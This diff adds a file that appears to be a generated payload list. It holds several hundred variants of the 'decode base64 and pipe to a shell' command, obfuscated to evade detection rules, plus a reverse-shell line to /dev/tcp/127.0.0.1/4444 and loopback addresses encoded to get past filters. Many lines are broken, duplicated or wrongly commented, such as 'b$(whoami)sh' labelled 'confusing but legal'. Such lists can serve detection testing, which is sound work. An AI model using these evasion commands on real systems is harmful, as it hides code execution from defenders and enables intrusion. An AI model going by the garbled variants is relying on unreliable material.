@@ -1,0 +1,300 @@
+1. echo #{bash_encoded} | ba$'\x73'e64 -d | bash
+2. echo #{bash_encoded} | b"a"s"e"64 -d | bash
+3. echo #{bash_encoded} | base64 -d | "ba""sh"
+4. echo #{bash_encoded} | base64 -d |/bin/bash
+5. echo #{bash_encoded} | base64 -d |/usr/bin/bash
+6. echo #{bash_encoded} | base64 -d |ba\sh
+7. echo #{bash_encoded} | base64 -d |bash\
+8. echo #{bash_encoded} | base64 -d | b@$h
+9. echo #{bash_encoded} | base64 -d | b\\ash
+10. echo #{bash_encoded} | base64 -d | b\ash
+11. echo #{bash_encoded} | base64 -d|ba""sh
+12. echo #{bash_encoded} | base64 -d|b\ash
+13. echo #{bash_encoded} | base64 -d|bash$'\x20'
+14. echo #{bash_encoded} | base64 -d|"bash"
+15. echo #{bash_encoded} | base64 -d | b`echo ash`
+16. echo #{bash_encoded} | base64 -d | $(which bash)
+17. echo #{bash_encoded} | base64 -d | $(/bin/ba"sh")
+18. echo #{bash_encoded} | base64 -d|`echo bash`
+19. echo #{bash_encoded} | base64 -d | ba$(echo sh)
+20. echo #{bash_encoded} | base64 -d | b$(echo ash)
+21. echo #{bash_encoded} | base64 -d | ba$(printf sh)
+22. echo #{bash_encoded} | base64 -d | $(echo /bin/bash)
+23. echo #{bash_encoded} | base64 -d|$SHELL
+24. echo #{bash_encoded} | base64 -d |$0
+25. echo #{bash_encoded} | base64 -d |${0}
+26. echo #{bash_encoded} | base64 -d |/b"in"/ba"sh"
+27. echo #{bash_encoded} | base64 -d |`/bin/ba"sh"`
+28. echo #{bash_encoded} | base64 -d | eval "bash"
+29. echo #{bash_encoded} | base64 -d | `bash`
+30. echo #{bash_encoded} | base64 -d | \b\a\s\h
+31. echo #{bash_encoded} | base64 -d | b🅰️sh
+32. echo #{bash_encoded} | base64 -d | ba\u0073h
+33. echo #{bash_encoded} | base64 -d | b'ash'
+34. echo #{bash_encoded} | base64 -d |"b""a""s""h"
+35. echo #{bash_encoded} | base64 -d |b@$@sh
+36. echo #{bash_encoded} | base64 -d |'b''a''s''h'
+37. echo #{bash_encoded} | base64 -d | b"\141\163\150"
+38. echo #{bash_encoded} | base64 -d | ba"$'\163'"h
+39. echo #{bash_encoded} | base64 -d | ba$(echo s)h
+40. echo #{bash_encoded} | base64 -d | b$(echo a)sh
+41. echo #{bash_encoded} | base64 -d | ba$((0+1))sh
+42. echo #{bash_encoded} | base64 -d | `\\b\\ash`
+43. echo #{bash_encoded} | base64 -d | /bin/b${EMPTY}ash
+44. echo #{bash_encoded} | base64 -d | b$(tr -d '\n'<<<ash)
+45. echo #{bash_encoded} | base64 -d | $(e"x"it; bash)
+46. echo #{bash_encoded} | base64 -d | /b\i\n/bash
+47. echo #{bash_encoded} | base64 -d | `basename $(which bash)`
+48. echo #{bash_encoded} | base64 -d |b🄰sh
+49. echo #{bash_encoded} | base64 -d | ba<tab>sh # (press tab in shell)
+50. echo #{bash_encoded} | base64 -d | .$(echo /bin/bash)
+51. echo #{bash_encoded} | base64 -d | b$(whoami)sh # confusing but legal
+52. echo #{bash_encoded} | base64 -d | ba$(hostname)sh # obfuscation
+53. echo #{bash_encoded} | base64 -d | eval 'ba'"sh"
+54. echo #{bash_encoded} | base64 -d | echo foo && bash
+55. echo #{bash_encoded} | base64 -d | /bin/b"as"h
+56. echo #{bash_encoded} | base64 -d | b${PATH##*/}ash
+57. echo #{bash_encoded} | base64 -d | bash --rcfile <(echo exit 0)
+58. echo #{bash_encoded} | base64 -d | nice bash
+59. echo #{bash_encoded} | base64 -d | setsid bash
+60. echo #{bash_encoded} | base64 -d | nohup bash >/dev/null 2>&1
+1. `echo #{bash_encoded} | base64 --decode | bash`
+2. `echo #{dash_encoded} | base64 --decode | dash`
+3. `echo #{fish_encoded} | base64 --decode | fish`
+4. `echo #{sh_encoded} | base64 --decode | sh`
+5. `echo #{bash_encoded} | base64 -d | /bin/bash`
+6. `echo #{bash_encoded} | base64 --d | bash`
+7. `echo #{bash_encoded} | base64 -decode | bash`
+8. `echo #{bash_encoded} | b64decode | bash` 
+9. `echo #{bash_encoded} | openssl base64 -d | bash`
+10. `echo #{bash_encoded} | python3 -m base64 -d | bash`
+11. `echo #{bash_encoded} | base64 -d | /usr/bin/bash`
+12. `echo #{bash_encoded} | base64 --decode | /bin/bash`
+13. `echo #{bash_encoded} | base64 -d | eval bash`
+14. `echo #{bash_encoded} | base64 -d | command bash`
+15. `echo #{bash_encoded} | base64 -d | exec bash`
+16. `cat <<< "#{bash_encoded}" | base64 -d | bash`
+17. `printf "#{bash_encoded}" | base64 -d | bash`
+18. `echo "#{bash_encoded}" | base64 -d | bash`
+19. `echo #{bash_encoded} | base64 -d | /bin/sh`
+20. `echo #{bash_encoded} | base64 --decode | /usr/bin/sh`
+21. `echo #{bash_encoded} | base64 -d | nohup bash`
+22. `echo #{bash_encoded} | base64 -d | bash -s`
+23. `echo #{bash_encoded} | base64 -d | setsid bash`
+24. `echo #{bash_encoded} | base64 -d | bash </dev/stdin`
+25. `echo #{bash_encoded} | base64 -d | bash -c "$(cat)"`
+26. `echo #{bash_encoded} | base64 -d | bash --noprofile`
+27. `echo #{bash_encoded} | base64 -d | bash --norc`
+28. `echo #{bash_encoded} | base64 -d | su -c bash`
+29. `echo #{bash_encoded} | base64 -d | /usr/local/bin/bash`
+30. `echo #{bash_encoded} | base64 -d | env bash`
+31. `echo #{bash_encoded} | base64 --decode | /usr/bin/env bash`
+32. `echo #{bash_encoded} | base64 -d | /usr/bin/env bash`
+33. `echo #{bash_encoded} | base64 -d | bash -l`
+34. `echo #{bash_encoded} | base64 -d | bash --login`
+35. `echo #{bash_encoded} | base64 -d | bash --init-file /dev/null`
+36. `echo #{bash_encoded} | base64 -d | bash -c "$(</dev/stdin)"`
+37. `echo #{bash_encoded} | base64 --decode | bash -c "$(cat)"`
+38. `echo #{bash_encoded} | base64 -d | bash <<< "$(cat)"`
+39. `echo #{bash_encoded} | base64 --decode | eval bash`
+40. `echo #{bash_encoded} | base64 --decode | bash -i`
+41. `echo #{bash_encoded} | base64 -d | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`
+42. `echo #{bash_encoded} | base64 -d | bash -p`
+43. `echo #{bash_encoded} | base64 -d | bash -r`
+44. `echo #{bash_encoded} | base64 --decode | sudo bash`
+45. `echo #{bash_encoded} | base64 --decode | sh -s`
+46. `echo #{bash_encoded} | base64 --decode | /usr/bin/sh`
+47. `echo #{bash_encoded} | base64 --decode | /bin/dash`
+48. `echo #{bash_encoded} | base64 -d | bash -c -`
+49. `echo #{bash_encoded} | base64 -d | bash <&0`
+50. `echo #{bash_encoded} | base64 -d | bash <<EOF`
+51. `echo #{bash_encoded} | base64 --decode | bash </proc/self/fd/0`
+52. `echo #{bash_encoded} | base64 --decode | bash --rcfile /dev/null`
+53. `echo #{bash_encoded} | base64 --decode | /bin/bash -s`
+54. `echo #{bash_encoded} | base64 -d | bash -x`
+55. `echo #{bash_encoded} | base64 -d | exec /bin/bash`
+56. `echo #{bash_encoded} | base64 -d | /bin/bash -c`
+57. `echo #{bash_encoded} | base64 -d | bash --posix`
+58. `echo #{bash_encoded} | base64 -d | env -i bash`
+59. `echo #{bash_encoded} | base64 -d | bash --noprofile --norc`
+60. `echo #{bash_encoded} | base64 -d | bash --rcfile <(echo "")`
+1. `echo #{bash_encoded} | base64 -d |`
+2. `echo #{bash_encoded} | base64 -d`
+3. `echo #{bash_encoded} | base64 | bash`
+4. `echo #{bash_encoded} | base64 -d |`
+5. `echo #{bash_encoded} |base64 -d|`
+6. `echo #{bash_encoded} | base64 -d| #comment`
+7. `echo #{bash_encoded} | base64 -d |#`
+8. `echo #{bash_encoded} | base64 -d | sleep 0; bash`
+9. `echo #{bash_encoded} | base64 -d | . bash`
+10. `echo #{bash_encoded} | base64 -d | exec bash`
+11. `echo #{bash_encoded} | base64 -d | (bash)`
+12. `echo #{bash_encoded} | base64 -d | command bash`
+13. `echo #{bash_encoded} | base64 -d | :; bash`
+14. `echo #{bash_encoded} | base64 -d | true; bash`
+15. `echo #{bash_encoded} | base64 -d | $(bash)`
+16. `echo #{bash_encoded} | base64 -d | xargs bash`
+17. `echo #{bash_encoded} | base64 -d | nohup bash`
+18. `echo #{bash_encoded} | base64 -d | \bash`
+19. `echo #{bash_encoded} | base64 -d | bash #`
+20. `echo #{bash_encoded} | base64 -d | bash </dev/null`
+21. `echo #{bash_encoded} | base64 -d |bash`
+22. `echo #{bash_encoded} | base64 -d | bash &`
+23. `echo #{bash_encoded} | base64 -d | bash &&`
+24. `echo #{bash_encoded} | base64 -d | bash || true`
+25. `echo #{bash_encoded} | base64 -d | eval bash`
+26. `echo #{bash_encoded} | base64 -d | setsid bash`
+27. `echo #{bash_encoded} | base64 -d | bash -s`
+28. `echo #{bash_encoded} | base64 -d | bash -`
+29. `echo #{bash_encoded} | base64 -d | /bin/bash`
+30. `echo #{bash_encoded} | base64 -d |`
+1. `echo #{bash_encoded} | base64 -d|`
+2. `echo #{bash_encoded}|base64 -d|`
+3. `echo #{bash_encoded}| base64 -d |`
+4. `echo #{bash_encoded}|base64 -d|bash`
+5. `echo #{bash_encoded} base64 -d | bash`
+6. `echo #{bash_encoded} | base64 -d| (bash)`
+7. `echo #{bash_encoded} | base64 -d| exec bash`
+8. `echo #{bash_encoded} | base64 -d|bash </dev/null`
+9. `echo #{bash_encoded} | base64 -d| \bash`
+10. `echo #{bash_encoded} | base64 -d| bash -`
+11. `echo #{bash_encoded} | base64 -d| bash -s`
+12. `echo #{bash_encoded} | base64 -d| bash||true`
+13. `echo #{bash_encoded} | base64 -d| bash # inline`
+14. `echo #{bash_encoded} | base64 -d|bash &`
+15. `echo #{bash_encoded} | base64 -d|setsid bash`
+16. `echo #{bash_encoded} | base64 -d|xargs bash`
+17. `echo #{bash_encoded} | base64 -d|command bash`
+18. `echo #{bash_encoded} | base64 -d|$(bash)`
+19. `echo #{bash_encoded} |base64 -d|sleep 0; bash`
+20. `echo #{bash_encoded} | base64 -d|:; bash`
+21. `echo #{bash_encoded}| base64 -d|bash -i`
+22. `echo #{bash_encoded}|base64 -d|/bin/bash`
+23. `echo #{bash_encoded}|base64 -d|bash </dev/tcp/0.0.0.0/0`
+24. `echo #{bash_encoded}|base64 -d|bash <<< ""`
+25. `echo #{bash_encoded}|base64 -d|bash <<< ''`
+26. `echo #{bash_encoded}|base64 -d|bash <&0`
+27. `echo #{bash_encoded}|base64 -d|bash 0<>/dev/null`
+28. `echo #{bash_encoded}|base64 -d|bash<<<EOF`
+29. `echo #{bash_encoded}|base64 -d|bash -c ':'`
+30. `echo #{bash_encoded} base64 -d|`
+1. `base64 -d <<< #{bash_encoded} | bash`
+2. `bash < <(echo #{bash_encoded} | base64 -d)`
+3. `base64 -d <<< #{bash_encoded} | /bin/bash`
+4. `bash -c "$(echo #{bash_encoded} | base64 -d)"`
+5. `eval $(echo #{bash_encoded} | base64 -d)`
+6. `cat <(echo #{bash_encoded}) | base64 -d | bash`
+7. `bash <<< $(echo #{bash_encoded} | base64 -d)`
+8. `bash <<< "$(echo #{bash_encoded} | base64 -d)"`
+9. `bash <(echo #{bash_encoded} | base64 -d)`
+10. `source <(echo #{bash_encoded} | base64 -d)`
+11. `exec bash -c "$(echo #{bash_encoded} | base64 -d)"`
+12. `bash -c "$(base64 -d <<< #{bash_encoded})"`
+13. `bash -c "$(cat <(echo #{bash_encoded}) | base64 -d)"`
+14. `base64 -d <<< #{bash_encoded} | bash -s`
+15. `bash -s < <(echo #{bash_encoded} | base64 -d)`
+16. `bash < <(base64 -d <<< #{bash_encoded})`
+17. `bash <(base64 -d <<< #{bash_encoded})`
+18. `eval "$(echo #{bash_encoded} | base64 -d)"`
+19. `/bin/bash -c "$(echo #{bash_encoded} | base64 -d)"`
+20. `bash -c $(echo #{bash_encoded} | base64 -d)`
+21. `bash -c "$(eval echo #{bash_encoded} | base64 -d)"`
+22. `bash - <<< "$(base64 -d <<< #{bash_encoded})"`
+23. `bash - <<< $(base64 -d <<< #{bash_encoded})`
+24. `bash -c "$(cat <<< #{bash_encoded} | base64 -d)"`
+25. `bash -c "$(printf '%s' #{bash_encoded} | base64 -d)"`
+26. `bash -c "$(echo #{bash_encoded} | base64 -d)" </dev/null`
+27. `bash -c "$(base64 -d <<<'#{bash_encoded}')"`
+28. `bash <<< $(base64 -d <<< #{bash_encoded})`
+29. `bash -c "$(sh -c 'echo #{bash_encoded}' | base64 -d)"`
+30. `bash -c "$(echo #{bash_encoded})" | base64 -d`
+1. `echo #{bash_encoded} | (base64 -d) | bash`
+2. `bash -c "$(echo #{bash_encoded} | base64 -d)"`
+3. `bash -c "`echo #{bash_encoded} | base64 -d`"`
+4. `bash -c "$(cat <<EOF | base64 -d)\n#{bash_encoded}\nEOF\n)"`
+5. `bash - < <(echo #{bash_encoded} | base64 -d)`
+6. `bash -c "$(cat /dev/stdin <<< $(echo #{bash_encoded} | base64 -d))"`
+7. `bash <<< "`base64 -d <<< #{bash_encoded}`"`
+8. `bash <<< "`cat <<EOF\n#{bash_encoded}\nEOF\n | base64 -d`"`
+9. `bash <(cat <<< #{bash_encoded} | base64 -d)`
+10. `bash <(echo #{bash_encoded}) | base64 -d`
+11. `bash <(echo #{bash_encoded}) | base64 -d &`
+12. `(echo #{bash_encoded} | base64 -d) | bash`
+13. `bash <<< $(cat <<< #{bash_encoded} | base64 -d)`
+14. `bash - <<< "`cat <<< #{bash_encoded} | base64 -d`"`
+15. `bash <(echo #{bash_encoded}) | base64 -d | cat`
+16. `bash <(sleep 0; echo #{bash_encoded} | base64 -d)`
+17. `echo #{bash_encoded} > tmp.b64 && base64 -d tmp.b64 | bash`
+18. `cat tmp.b64 | base64 -d | bash` *(with tmp.b64 pre-filled)*
+19. `base64 -d <<< "#{bash_encoded}" | bash`
+20. `bash -c "$(cat <(echo #{bash_encoded}) | base64 -d)"`
+21. `bash -c "$(echo #{bash_encoded})" | base64 -d`
+22. `bash -c "$(base64 -d <<< "#{bash_encoded}")"`
+23. `bash -c "$(sh -c 'echo #{bash_encoded} | base64 -d')"`
+24. `base64 -d <<< "#{bash_encoded}" | exec bash`
+25. `base64 -d <<< "#{bash_encoded}" | bash -s`
+26. `bash <(echo #{bash_encoded}) | (base64 -d)`
+27. `(base64 -d <<< "#{bash_encoded}") | (bash)`
+28. `bash <<< $(cat <<EOF\n#{bash_encoded}\nEOF\n | base64 -d)`
+29. `bash -c "$(read x; echo $x | base64 -d)" <<< "#{bash_encoded}"`
+30. `cat <<< #{bash_encoded} | base64 -d | setsid bash`
+1. echo #{bash_encoded} | base64 -d | bash #address=2130706433
+2. echo #{dash_encoded} | base64 -d | dash #address=0x7F000001
+3. echo #{fish_encoded} | base64 -d | fish #address=0177.0.0.1
+4. echo #{sh_encoded} | base64 -d | sh #address=0x7F.0x0.0x0.0x1
+5. echo #{bash_encoded} | base64 -d | bash #address=127.000.000.001
+6. echo #{dash_encoded} | base64 -d | dash #address=127.1
+7. echo #{fish_encoded} | base64 -d | fish #address=0x7f000001
+8. echo #{sh_encoded} | base64 -d | sh #address=0x7F000001
+9. echo #{bash_encoded} | base64 -d | bash #address=127.1.0.0
+10. echo #{dash_encoded} | base64 -d | dash #address=127.0.1
+11. echo #{fish_encoded} | base64 -d | fish #address=0177.1
+12. echo #{sh_encoded} | base64 -d | sh #address=0x7f.1
+13. echo #{bash_encoded} | base64 -d | bash #address=0x7f.0.0.1
+14. echo #{dash_encoded} | base64 -d | dash #address=127.00.00.01
+15. echo #{fish_encoded} | base64 -d | fish #address=127.0.00.1
+16. echo #{sh_encoded} | base64 -d | sh #address=127.000.1
+17. echo #{bash_encoded} | base64 -d | bash #address=0x0000007f.00000000.00000000.00000001
+18. echo #{dash_encoded} | base64 -d | dash #address=0177.00.00.01
+19. echo #{fish_encoded} | base64 -d | fish #address=127.1.1.1-0.0.0.0
+20. echo #{sh_encoded} | base64 -d | sh #address=2130706433
+21. echo #{bash_encoded} | base64 -d | bash #address=0x7f000001
+22. echo #{dash_encoded} | base64 -d | dash #address=127.1
+23. echo #{fish_encoded} | base64 -d | fish #address=0x7f000001
+24. echo #{sh_encoded} | base64 -d | sh #address=127.000.000.001
+25. echo #{bash_encoded} | base64 -d | bash #address=127.00.1
+26. echo #{dash_encoded} | base64 -d | dash #address=127.0.0x1
+27. echo #{fish_encoded} | base64 -d | fish #address=0x7f.0.1
+28. echo #{sh_encoded} | base64 -d | sh #address=0x7f.0x0.1
+29. echo #{bash_encoded} | base64 -d | bash #address=127.0.1.0
+30. echo #{dash_encoded} | base64 -d | dash #address=127.0.0.1%lo0
+31. echo #{fish_encoded} | base64 -d | fish #address=0x7F000001
+32. echo #{sh_encoded} | base64 -d | sh #address=127.0.0.1%0
+33. echo #{bash_encoded} | base64 -d | bash #address=127.000000000.0.1
+34. echo #{dash_encoded} | base64 -d | dash #address=127.1.0x0
+35. echo #{fish_encoded} | base64 -d | fish #address=0x7F.0.1
+36. echo #{sh_encoded} | base64 -d | sh #address=0x7f.0x000000.1
+37. echo #{bash_encoded} | base64 -d | bash #address=0x0000007f000001
+38. echo #{dash_encoded} | base64 -d | dash #address=127.0x0.1
+39. echo #{fish_encoded} | base64 -d | fish #address=2130706433
+40. echo #{sh_encoded} | base64 -d | sh #address=0177.0.1
+41. echo #{bash_encoded} | base64 -d | bash #address=127.0.00000001
+42. echo #{dash_encoded} | base64 -d | dash #address=0x7f.00.00.01
+43. echo #{fish_encoded} | base64 -d | fish #address=127.0.1.000000
+44. echo #{sh_encoded} | base64 -d | sh #address=0x007F.0x0.0x0.0x1
+45. echo #{bash_encoded} | base64 -d | bash #address=127.000000.1
+46. echo #{dash_encoded} | base64 -d | dash #address=127.0x00.0x01
+47. echo #{fish_encoded} | base64 -d | fish #address=127.0x00000001
+48. echo #{sh_encoded} | base64 -d | sh #address=127.0.0.1%eth0
+49. echo #{bash_encoded} | base64 -d | bash #address=0x00007f000001
+50. echo #{dash_encoded} | base64 -d | dash #address=127.0x0000.0x1
+51. echo #{fish_encoded} | base64 -d | fish #address=127.0.0.1#loopback
+52. echo #{sh_encoded} | base64 -d | sh #address=2130706433 (decimal)
+53. echo #{bash_encoded} | base64 -d | bash #address=0x7f000001 (hex)
+54. echo #{dash_encoded} | base64 -d | dash #address=0177.0000.0000.0001 (octal)
+55. echo #{fish_encoded} | base64 -d | fish #address=0x7F000001UL
+56. echo #{sh_encoded} | base64 -d | sh #address=0x7f000001L
+57. echo #{bash_encoded} | base64 -d | bash #address=127.0.000000001
+58. echo #{dash_encoded} | base64 -d | dash #address=0x7f.0.0.0x1
+59. echo #{fish_encoded} | base64 -d | fish #address=127.000000.000000.1
+60. echo #{sh_encoded} | base64 -d | sh #address=127.0.0.1%lo
